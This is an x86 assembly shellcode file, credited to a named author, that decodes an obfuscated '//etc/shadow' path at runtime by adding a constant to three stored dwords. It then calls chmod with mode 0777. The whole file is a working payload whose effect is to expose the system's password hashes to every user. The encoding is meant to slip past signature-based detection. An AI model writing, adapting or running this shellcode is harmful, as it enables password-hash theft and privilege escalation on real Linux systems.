;Author: Ymir F. Eboras
;chmod(/etc/shadow, 0777) Polymorphism

global _start

section .text


_start: 

	jmp short call_filename

filename:

	pop esi
        xor eax,eax
        push eax

	mov edi, dword [esi]
	add edi, 0x11111111
	push edi

	mov edi, dword [esi+4]
	add edi, 0x11111111
	push edi
	
 	mov edi, dword [esi+8]
	add edi, 0x11111111
	push edi
	
	mov ebx, esp
        push word 0x1ff
	pop ecx
        mov al,0xf
        int 0x80


call_filename:
	
	call filename
	filename1 dd 0x665e5350
	filename2 dd 0x57621e52
	filename3 dd 0x63541e1e
